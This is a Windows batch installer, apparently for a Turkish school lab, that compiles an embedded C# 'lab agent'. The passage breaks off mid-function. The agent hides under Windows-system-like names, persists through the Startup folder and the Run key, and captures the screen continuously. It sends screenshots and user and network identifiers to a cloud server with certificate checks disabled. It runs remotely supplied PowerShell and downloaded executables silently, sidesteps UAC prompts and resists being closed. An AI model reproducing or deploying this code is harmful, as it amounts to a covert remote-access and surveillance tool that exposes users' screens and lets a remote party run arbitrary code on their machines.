@echo off
chcp 65001 >nul
title Torbalı Bilsem Laboratuvar Servisi Kurulumu

set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

set "PC_NAME=%~1"
if not "%PC_NAME%"=="" goto :DO_INSTALL

:: Rastgele 4 haneli bilgisayar numarasi uret (1000 - 9999 arasi)
set /a RND_NUM=(%RANDOM% %% 9000) + 1000
set "PC_NAME=Bilsem-PC%RND_NUM%"

cls
echo =======================================================
echo         TORBALI BILSEM LABORATUVAR KURULUMU
echo =======================================================
echo  Otomatik Bilgisayar No : %PC_NAME%
echo  Kurulum yapiliyor, lutfen bekleyin...
echo =======================================================

:DO_INSTALL
echo %PC_NAME%> "%INSTALL_DIR%\pc_name.txt"
taskkill /f /im WinSystemHost.exe >nul 2>&1
taskkill /f /im WinSystemGuard.exe >nul 2>&1
taskkill /f /im BilsemLabHost.exe >nul 2>&1
taskkill /f /im PiriReisLabHost.exe >nul 2>&1
set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"
set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"

more +57 "%~f0" > "%CS_FILE%"

"%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1
copy /y "%EXE_FILE%" "%GUARD_FILE%" >nul 2>&1
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
) > "%VBS_STARTUP%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
del /f /q "%CS_FILE%" >nul 2>&1
echo.
echo =======================================================
echo  [OK] Torbalı Bilsem Lab Servisi Basariyla Kuruldu!
echo  [OK] Bilgisayar: %PC_NAME%
echo  [OK] Servis su an arka planda calisiyor.
echo  [OK] Bilgisayar her acildiginda otomatik baslayacaktir.
echo =======================================================
echo.
timeout /t 3 >nul
exit /b 0
using System.Collections.Generic;

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace WinSystemService
{
    public class LabAgentForm : Form
    {
        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;

        private Label lockLabel;
        private PictureBox demoPic;
        private System.Windows.Forms.Timer captureTimer;
        private System.Windows.Forms.Timer topMostTimer;
        private bool isLocked = false;
        private bool isDemoActive = false;
        private string lastUrlId = "";
        private string lastAnnounce = "";
        private string lastInputId = "";
        private string lastInstallId = "";
        private string currentInstallStatusJson = null;
        private readonly object executedLock = new object();
        private HashSet<string> executedIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private string executedLogFile = "";
        private string deskNo;
        private string studentName;
        private string clientId;
        private string localIp = "";
        private string localMac = "";
        private ImageCodecInfo jpegCodec;
        private EncoderParameters encParams;

        private Bitmap screenBmp;
        private Bitmap resizedBmp;
        private int lastScreenW = 0;
        private int lastScreenH = 0;
        private uint lastFrameHash = 0;
        private int unchangedCount = 0;
        private int isSendingCloud = 0;
        private int isSendingLocal = 0;

        private const string LIVE_API = "https://pirireis-api-v3ku.onrender.com/api/labizleme/frame";
        private const string LOCAL_API = "http://192.168.23.244:4000/api/frame";

        public LabAgentForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.DefaultConnectionLimit = 32;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;

            try
            {
                string appDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
                if (!Directory.Exists(appDir)) Directory.CreateDirectory(appDir);
                executedLogFile = Path.Combine(appDir, "executed_commands.txt");
                if (File.Exists(executedLogFile))
                {
                    string[] lines = File.ReadAllLines(executedLogFile);
                    foreach (string line in lines)
                    {
                        string trimmed = line.Trim();
                        if (!string.IsNullOrEmpty(trimmed))
                        {
                            executedIds.Add(trimmed);
                        }
                    }
                }
            }
            catch { }
            WebRequest.DefaultWebProxy = null;

            deskNo = Environment.MachineName;
            try
            {
                string pcFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService", "pc_name.txt");
                if (File.Exists(pcFile))
                {
                    string saved = File.ReadAllText(pcFile).Trim();
                    if (!string.IsNullOrEmpty(saved))
                    {
                        deskNo = saved;
                    }
                }
            }
            catch { }
            studentName = Environment.UserName;
            clientId = "pc-" + deskNo;
            DetectNetworkInfo();

            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg")
                {
                    jpegCodec = codec;
                    break;
                }
            }
            encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 52L);

            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.BackColor = Color.FromArgb(76, 5, 25);
            this.ControlBox = false;
            this.Opacity = 0;

            lockLabel = new Label();
            lockLabel.Dock = DockStyle.Fill;
            lockLabel.ForeColor = Color.White;
            lockLabel.Font = new Font("Segoe UI", 24, FontStyle.Bold);
            lockLabel.TextAlign = ContentAlignment.MiddleCenter;
            lockLabel.Text = "🔒 TORBALI BİLSEM LABORATUVARI\r\n\r\nEKRAN KİLİTLİ (DİKKAT MODU)\r\n\r\nÖğretmen ders anlatıyor. Lütfen ekranınıza değil öğretmeninize odaklanın.";
            lockLabel.Visible = false;
            this.Controls.Add(lockLabel);

            demoPic = new PictureBox();
            demoPic.Dock = DockStyle.Fill;
            demoPic.BackColor = Color.Black;
            demoPic.SizeMode = PictureBoxSizeMode.Zoom;
            demoPic.Visible = false;
            this.Controls.Add(demoPic);

            this.FormClosing += new FormClosingEventHandler(OnFormClosing);

            captureTimer = new System.Windows.Forms.Timer();
            captureTimer.Interval = 320;
            captureTimer.Tick += new EventHandler(OnCaptureTick);
            captureTimer.Start();

            topMostTimer = new System.Windows.Forms.Timer();
            topMostTimer.Interval = 350;
            topMostTimer.Tick += new EventHandler(OnTopMostTick);
            topMostTimer.Start();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                cp.ExStyle |= 0x08000000;
                return cp;
            }
        }

        protected override bool ShowWithoutActivation
        {
            get { return !isLocked && !isDemoActive; }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if ((keyData & Keys.Alt) == Keys.Alt || (keyData & Keys.Control) == Keys.Control || keyData == Keys.Escape)
            {
                if (isLocked || isDemoActive) return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void HideCompletely()
        {
            this.Opacity = 0;
            this.WindowState = FormWindowState.Normal;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.ShowInTaskbar = false;
        }

        private void ShowOverlayFullScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            this.Location = bounds.Location;
            this.Size = bounds.Size;
            this.WindowState = FormWindowState.Maximized;
            this.Opacity = 1;
            this.TopMost = true;
            this.BringToFront();
            this.Activate();
        }

        private void OnTopMostTick(object sender, EventArgs e)
        {
            if (isLocked || isDemoActive)
            {
                ShowOverlayFullScreen();
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.WindowsShutDown)
            {
                e.Cancel = true;
                if (!isLocked && !isDemoActive) HideCompletely();
            }
        }

        private void DetectNetworkInfo()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                string s = ip.Address.ToString();
                                if (s.StartsWith("192.168.") || s.StartsWith("10."))
                                {
                                    localIp = s;
                                    byte[] macBytes = ni.GetPhysicalAddress().GetAddressBytes();
                                    string[] hex = new string[macBytes.Length];
                                    for (int i = 0; i < macBytes.Length; i++) hex[i] = macBytes[i].ToString("X2");
                                    localMac = string.Join("-", hex);
                                    return;
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }

        private static uint ComputeFastHash(byte[] bytes)
        {
            uint hash = 2166136261u;
            int step = Math.Max(1, bytes.Length / 256);
            for (int i = 0; i < bytes.Length; i += step)
            {
                hash ^= bytes[i];
                hash *= 16777619u;
            }
            return hash;
        }

        private string CaptureScreenDataUrl(out string resolution, out bool frameChanged)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            resolution = bounds.Width + "x" + bounds.Height;
            int targetW = 800;
            int targetH = (int)Math.Round(bounds.Height * ((double)targetW / bounds.Width));

            if (screenBmp == null || lastScreenW != bounds.Width || lastScreenH != bounds.Height)
            {
                if (screenBmp != null) screenBmp.Dispose();
                if (resizedBmp != null) resizedBmp.Dispose();
                screenBmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                resizedBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb);
                lastScreenW = bounds.Width;
                lastScreenH = bounds.Height;
            }

            using (Graphics g = Graphics.FromImage(screenBmp))
            {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
            }

            using (Graphics g2 = Graphics.FromImage(resizedBmp))
            {
                g2.InterpolationMode = InterpolationMode.Low;
                g2.CompositingQuality = CompositingQuality.HighSpeed;
                g2.SmoothingMode = SmoothingMode.None;
                g2.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                g2.DrawImage(screenBmp, 0, 0, targetW, targetH);
            }

            using (MemoryStream ms = new MemoryStream(32768))
            {
                resizedBmp.Save(ms, jpegCodec, encParams);
                byte[] arr = ms.ToArray();
                uint h = ComputeFastHash(arr);
                if (h == lastFrameHash && unchangedCount < 6)
                {
                    unchangedCount++;
                    frameChanged = false;
                    return null;
                }
                lastFrameHash = h;
                unchangedCount = 0;
                frameChanged = true;
                return "data:image/jpeg;base64," + Convert.ToBase64String(arr);
            }
        }

        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
        }

        private string PostJson(string url, byte[] data, int timeoutMs)
        {
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json; charset=utf-8";
                req.Timeout = timeoutMs;
                req.ReadWriteTimeout = timeoutMs;
                req.KeepAlive = true;
                req.Proxy = null;
                req.ContentLength = data.Length;
                using (Stream reqStream = req.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                using (StreamReader sr = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                {
                    return sr.ReadToEnd();
                }
            }
            catch
            {
                return null;
            }
        }

        private void OnCaptureTick(object sender, EventArgs e)
        {
            if (isSendingCloud == 1 && isSendingLocal == 1) return;

            try
            {
                string resStr;
                bool changed;
                string dataUrl = CaptureScreenDataUrl(out resStr, out changed);

                string json = "{"
                    + "\"id\":\"" + EscapeJson(clientId) + "\","
                    + "\"deskNo\":\"" + EscapeJson(deskNo) + "\","
                    + "\"studentName\":\"" + EscapeJson(studentName) + "\","
                    + "\"name\":\"" + EscapeJson(deskNo + " (" + studentName + ")") + "\","
                    + "\"localIp\":\"" + EscapeJson(localIp) + "\","
                    + "\"mac\":\"" + EscapeJson(localMac) + "\","
                    + "\"resolution\":\"" + EscapeJson(resStr) + "\","
                    + "\"handRaised\":false,"
                    + "\"sharingActive\":true,"
                    + "\"clientType\":\"native\""
                    + (currentInstallStatusJson != null ? ",\"installStatus\":" + currentInstallStatusJson : "")
                    + (changed && dataUrl != null ? ",\"frame\":\"" + dataUrl + "\"" : "")
                    + "}";

                byte[] payloadBytes = Encoding.UTF8.GetBytes(json);

                if (Interlocked.CompareExchange(ref isSendingLocal, 1, 0) == 0)
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        try
                        {
                            string localResp = PostJson(LOCAL_API, payloadBytes, 600);
                            if (!string.IsNullOrEmpty(localResp))
                            {
                                this.BeginInvoke((MethodInvoker)delegate
                                {
                                    ApplyServerResponse(localResp);
                                });
                            }
                        }
                        catch { }
                        finally
                        {
                            Interlocked.Exchange(ref isSendingLocal, 0);
                        }
                    });
                }

                if (Interlocked.CompareExchange(ref isSendingCloud, 1, 0) == 0)
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        try
                        {
                            string cloudResp = PostJson(LIVE_API, payloadBytes, 2500);
                            if (!string.IsNullOrEmpty(cloudResp))
                            {
                                this.BeginInvoke((MethodInvoker)delegate
                                {
                                    ApplyServerResponse(cloudResp);
                                });
                            }
                        }
                        catch { }
                        finally
                        {
                            Interlocked.Exchange(ref isSendingCloud, 0);
                        }
                    });
                }
            }
            catch { }
        }

        private static string ExtractJsonString(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            Match m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"");
            if (!m.Success) return null;
            try { return Regex.Unescape(m.Groups[1].Value); } catch { return m.Groups[1].Value; }
        }

        private static string ExtractJsonObject(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            int idx = json.IndexOf("\"" + key + "\"");
            if (idx < 0) return null;
            int braceStart = json.IndexOf('{', idx);
            if (braceStart < 0) return null;
            int depth = 0;
            for (int i = braceStart; i < json.Length; i++)
            {
                if (json[i] == '{') depth++;
                else if (json[i] == '}')
                {
                    depth--;
                    if (depth == 0)
                    {
                        return json.Substring(braceStart + 1, i - braceStart - 1);
                    }
                }
            }
            return null;
        }

        private void SetInstallStatus(string id, string name, string status, int progress, string message)
        {
            currentInstallStatusJson = "{"
                + "\"id\":\"" + EscapeJson(id) + "\","
                + "\"name\":\"" + EscapeJson(name) + "\","
                + "\"status\":\"" + EscapeJson(status) + "\","
                + "\"progress\":" + progress + ","
                + "\"message\":\"" + EscapeJson(message) + "\","
                + "\"timestamp\":\"" + DateTime.Now.ToString("HH:mm:ss") + "\""
                + "}";
        }

        private void ExecuteRemoteInstall(string id, string type, string name, string url, string args, string cmd)
        {
            try
            {
                SetInstallStatus(id, name, "downloading", 10, "Gorev hazirlaniyor...");

                // 1. DUVAR KAGIDI DEGISTIRME (Dogrudan C# ve Native Windows API)
                if (type == "wallpaper")
                {
                    SetInstallStatus(id, name, "downloading", 25, "Duvar kagidi gorseli indiriliyor...");
                    string wallUrl = string.IsNullOrEmpty(url) ? cmd : url;
                    if (wallUrl.StartsWith("/"))
                    {
                        wallUrl = "https://pirireis-api-v3ku.onrender.com" + wallUrl;
                    }
                    string wallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
                    if (!Directory.Exists(wallDir)) Directory.CreateDirectory(wallDir);
                    string rawPath = Path.Combine(wallDir, "wallpaper_raw.img");
                    string bmpPath = Path.Combine(wallDir, "wallpaper.bmp");
                    string jpgPath = Path.Combine(wallDir, "wallpaper.jpg");

                    using (WebClient wc = new WebClient())
                    {
                        wc.Proxy = null;
                        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                        wc.DownloadFile(wallUrl, rawPath);
                    }

                    SetInstallStatus(id, name, "installing", 70, "Masaustu arka plani direkt uygulaniyor...");

                    // Gorseli C# Image ile acip standart BMP ve JPG olarak kaydet
                    try
                    {
                        using (Image img = Image.FromFile(rawPath))
                        {
                            img.Save(bmpPath, ImageFormat.Bmp);
                            img.Save(jpgPath, ImageFormat.Jpeg);
                        }
                    }
                    catch
                    {
                        try { File.Copy(rawPath, bmpPath, true); } catch { }
                        try { File.Copy(rawPath, jpgPath, true); } catch { }
                    }

                    // Windows 10 / 11 Themes (TranscodedWallpaper) klasorune kopyala
                    try
                    {
                        string themeDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Themes");
                        if (!Directory.Exists(themeDir)) Directory.CreateDirectory(themeDir);
                        string transcoded = Path.Combine(themeDir, "TranscodedWallpaper");
                        File.Copy(jpgPath, transcoded, true);
                    }
                    catch { }

                    // Registry: WallpaperStyle = 2 (Stretch), TileWallpaper = 0
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
                        {
                            if (key != null)
                            {
                                key.SetValue("WallpaperStyle", "2");
                                key.SetValue("TileWallpaper", "0");
                                key.SetValue("Wallpaper", bmpPath);
                            }
                        }
                    }
                    catch { }

                    // Windows Native SPI_SETDESKWALLPAPER (0x0014)
                    SystemParametersInfo(0x0014, 0, bmpPath, 0x01 | 0x02);

                    // Masaustunu aninda yenile
                    try
                    {
                        ProcessStartInfo psiRefresh = new ProcessStartInfo("rundll32.exe", "user32.dll,UpdatePerUserSystemParameters 1, True");
                        psiRefresh.UseShellExecute = false;
                        psiRefresh.CreateNoWindow = true;
                        Process.Start(psiRefresh);
                    }
                    catch { }

                    try
                    {
                        ProcessStartInfo psiPs = new ProcessStartInfo("powershell.exe",
                            "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '" + bmpPath.Replace("'", "''") + "' -Force; Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name WallpaperStyle -Value 2 -Force; rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True; rundll32.exe user32.dll,UpdatePerUserSystemParameters\"");
                        psiPs.UseShellExecute = false;
                        psiPs.CreateNoWindow = true;
                        Process.Start(psiPs);
                    }
                    catch { }

                    SetInstallStatus(id, name, "success", 100, "Masaustu duvar kagidi direkt olarak degistirildi!");
                    return;
                }

                // 2. AJAN GUNCELLEME (Tek dokunusla uzaktan bat / ajan yenileme)
                if (type == "update_agent" || (type == "powershell" && (cmd ?? "").Contains("WinSystemSetup.bat")))
                {
                    SetInstallStatus(id, name, "downloading", 25, "Guncel ajan paketi sunucudan indiriliyor...");
                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-api-v3ku.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-api-v3ku.onrender.com" + updateUrl;
                    string newBatPath = Path.Combine(Path.GetTempPath(), "WinSystemSetup_New.bat");
                    using (WebClient wc = new WebClient())
                    {
                        wc.Proxy = null;
                        wc.Headers.Add("User-Agent", "PiriReisLabAgent");
                        wc.DownloadFile(updateUrl, newBatPath);
                    }

                    if (!File.Exists(newBatPath) || new FileInfo(newBatPath).Length < 500)
                    {
                        SetInstallStatus(id, name, "error", 100, "Guncelleme paketi indirilemedi.");
                        return;
                    }

                    SetInstallStatus(id, name, "success", 100, "Guncelleme basariyla indirildi. Servis yeniden derlenip baslatiliyor...");

                    string runnerCmd = Path.Combine(Path.GetTempPath(), "LabUpdate_" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".cmd");
                    string runnerContent = "@echo off\r\n"
                        + "timeout /t 2 /nobreak >nul\r\n"
                        + "taskkill /f /im WinSystemHost.exe >nul 2>&1\r\n"
                        + "call \"" + newBatPath + "\" --silent\r\n"
                        + "del /f /q \"" + newBatPath + "\" >nul 2>&1\r\n"
                        + "del /f /q \"%~f0\" >nul 2>&1\r\n"
                        + "exit /b 0\r\n";
                    File.WriteAllText(runnerCmd, runnerContent, Encoding.Default);

                    ProcessStartInfo psiUp = new ProcessStartInfo("cmd.exe", "/c \"" + runnerCmd + "\"");
                    psiUp.UseShellExecute = false;
                    psiUp.CreateNoWindow = true;
                    psiUp.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(psiUp);
                    Environment.Exit(0);
                    return;
                }

                // 3. WINGET ILE PAKET KURULUMU (Sessiz ve UAC'siz)
                if (type == "winget")
                {
                    SetInstallStatus(id, name, "installing", 20, "Winget ile sessiz kurulum baslatiliyor (" + cmd + ")...");
                    string pkg = (cmd ?? "").Trim();

                    string tempPs = Path.Combine(Path.GetTempPath(), "LabWinget_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".ps1");
                    string psContent =
                        "$env:__COMPAT_LAYER = 'RunAsInvoker'\r\n" +
                        "$env:WINGET_DISABLE_INTERACTIVITY = '1'\r\n" +
                        "$r1 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force " + (string.IsNullOrEmpty(args) ? "" : args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
                        "if ($r1 -and ($r1.ExitCode -eq 0 -or $r1.ExitCode -eq 3010)) { exit 0 }\r\n" +
                        "$r2 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --scope user --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force " + (string.IsNullOrEmpty(args) ? "" : args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
                        "if ($r2) { exit $r2.ExitCode } else { exit 1 }\r\n";
                    File.WriteAllText(tempPs, psContent, Encoding.UTF8);

                    ProcessStartInfo psiPs = new ProcessStartInfo("powershell.exe",
                        "-ExecutionPolicy Bypass -NonInteractive -NoProfile -WindowStyle Hidden -File \"" + tempPs + "\"");
                    psiPs.UseShellExecute = false;
                    psiPs.CreateNoWindow = true;
                    psiPs.WindowStyle = ProcessWindowStyle.Hidden;
                    psiPs.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";
                    psiPs.EnvironmentVariables["WINGET_DISABLE_INTERACTIVITY"] = "1";
                    psiPs.EnvironmentVariables["SEE_MASK_NOZONECHECKS"] = "1";

                    int exitCode = -1;
                    using (Process p = Process.Start(psiPs))
                    {
                        bool finished = p.WaitForExit(900000);
                        if (!finished)
                        {
                            try { p.Kill(); } catch { }
                            SetInstallStatus(id, name, "error", 100, "Zaman asimi: Kurulum 15 dakikada tamamlanamadi.");
                            try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }
                            return;
                        }
                        exitCode = p.ExitCode;
                    }
                    try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }

                    if (exitCode == 0 || exitCode == 3010)
                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu (sessiz, UAC yok)!");
                    else
                        SetInstallStatus(id, name, "error", 100, "Winget kurulum hatasi. Kod: " + exitCode);
                    return;
                }

                // 4. POWERSHELL KOMUTU
                if (type == "powershell")
                {
                    SetInstallStatus(id, name, "installing", 40, "Komut yurutuluyor...");
                    string tempPs1 = Path.Combine(Path.GetTempPath(), "LabCmd_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".ps1");
                    File.WriteAllText(tempPs1, cmd ?? "", Encoding.UTF8);

                    ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File \"" + tempPs1 + "\"");
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    psi.WindowStyle = ProcessWindowStyle.Hidden;

                    using (Process p = Process.Start(psi))
                    {
                        bool finished = p.WaitForExit(300000);
                        if (!finished)
                        {
                            try { p.Kill(); } catch { }
                            SetInstallStatus(id, name, "error", 100, "Zaman asimi.");
                            try { if (File.Exists(tempPs1)) File.Delete(tempPs1); } catch { }
                            return;
                        }
                        if (p.ExitCode == 0)
                        {
                            SetInstallStatus(id, name, "success", 100, "Islem basariyla tamamlandi.");
                        }
                        else
                        {
                            SetInstallStatus(id, name, "error", 100, "Hata Kodu: " + p.ExitCode);
                        }
                    }
                    try { if (File.Exists(tempPs1)) File.Delete(tempPs1); } catch { }
                    return;
                }

                // 5. EXE / MSI / BAT / CMD INDIRME VE SESSIZ KURULUM
                if (string.IsNullOrEmpty(url))
                {
                    SetInstallStatus(id, name, "error", 100, "Kurulum adresi (URL) bos.");
                    return;
                }

                string downloadUrl = url;
                if (downloadUrl.StartsWith("/"))
                {
                    downloadUrl = "https://pirireis-api-v3ku.onrender.com" + downloadUrl;
                }

                string ext = ".exe";
                if (downloadUrl.ToLower().Contains(".msi")) ext = ".msi";
                else if (downloadUrl.ToLower().Contains(".bat")) ext = ".bat";
                else if (downloadUrl.ToLower().Contains(".cmd")) ext = ".cmd";

                string tempFile = Path.Combine(Path.GetTempPath(), "LabSetup_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ext);

                SetInstallStatus(id, name, "downloading", 45, "Dosya indiriliyor (" + ext + ")...");
                using (WebClient wc = new WebClient())
                {
                    wc.Proxy = null;
                    wc.Headers.Add("User-Agent", "PiriReisLabAgent");
                    wc.DownloadFile(downloadUrl, tempFile);
                }

                SetInstallStatus(id, name, "installing", 70, "Sessiz kurulum yapiliyor...");

                ProcessStartInfo psiFile;
                if (ext == ".msi")
                {
                    string msiArgs = string.IsNullOrEmpty(args)
                        ? "/i \"" + tempFile + "\" /passive /norestart"
                        : "/i \"" + tempFile + "\" " + args;
                    psiFile = new ProcessStartInfo("msiexec.exe", msiArgs);
                    psiFile.UseShellExecute = true;
                }
                else if (ext == ".bat" || ext == ".cmd")
                {
                    psiFile = new ProcessStartInfo("cmd.exe", "/c \"" + tempFile + "\" " + (args ?? ""));
                    psiFile.UseShellExecute = true;
                }
                else
                {
                    if (string.IsNullOrEmpty(args) || args.Trim() == "direct")
                    {
                        psiFile = new ProcessStartInfo(tempFile);
                        psiFile.UseShellExecute = true;
                        psiFile.WindowStyle = ProcessWindowStyle.Normal;
                    }
                    else
                    {
                        psiFile = new ProcessStartInfo(tempFile, args.Trim());
                        psiFile.UseShellExecute = true;
                        psiFile.WindowStyle = ProcessWindowStyle.Normal;
                    }
                }

                psiFile.WorkingDirectory = Path.GetDirectoryName(tempFile);

                Process proc = Process.Start(psiFile);
                SetInstallStatus(id, name, "success", 100, "Kurulum direkt olarak baslatildi!");

                if (proc != null)
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        try
                        {
                            proc.WaitForExit(900000);
                            try { if (File.Exists(tempFile)) File.Delete(tempFile); } catch { }
                        }
                        catch { }
                    });
                }

                try
                {
                    if (File.Exists(tempFile)) File.Delete(tempFile);
                }
                catch { }
            }
            catch (Exception ex)
            {
                SetInstallStatus(id, name, "error", 100, "Hata: " + ex.Message);
            }
        }

        private void ApplyServerResponse(string json)
        {
            bool locked = Regex.IsMatch(json, "\"locked\"\\s*:\\s*true");
            bool streamActive = Regex.IsMatch(json, "\"teacherStreamActive\"\\s*:\\s*true");

            if (locked)
            {
                string msg = ExtractJsonString(json, "lockMessage");
                if (!string.IsNullOrEmpty(msg))
                {
                    lockLabel.Text = "EKRAN KILITLI (DIKKAT MODU)\r\n\r\n" + msg;
                }
                isLocked = true;
                demoPic.Visible = false;
                lockLabel.Visible = true;
                ShowOverlayFullScreen();
            }
            else if (streamActive)
            {
                string tFrame = ExtractJsonString(json, "teacherFrame");
                if (!string.IsNullOrEmpty(tFrame) && tFrame.Contains(","))
                {
                    try
                    {
                        string b64 = tFrame.Substring(tFrame.IndexOf(",") + 1);
                        byte[] imgBytes = Convert.FromBase64String(b64);
                        MemoryStream ms = new MemoryStream(imgBytes);
                        Image old = demoPic.Image;
                        demoPic.Image = Image.FromStream(ms);
                        if (old != null) old.Dispose();
                    }
                    catch { }
                }
                isDemoActive = true;
                lockLabel.Visible = false;
                demoPic.Visible = true;
                ShowOverlayFullScreen();
            }
            else
            {
                if (isLocked || isDemoActive)
                {
                    isLocked = false;
                    isDemoActive = false;
                    lockLabel.Visible = false;
                    demoPic.Visible = false;
                    HideCompletely();
                }
            }

            string urlObj = ExtractJsonObject(json, "openUrlCommand");
            if (!string.IsNullOrEmpty(urlObj))
            {
                string uid = ExtractJsonString(urlObj, "id");
                string url = ExtractJsonString(urlObj, "url");
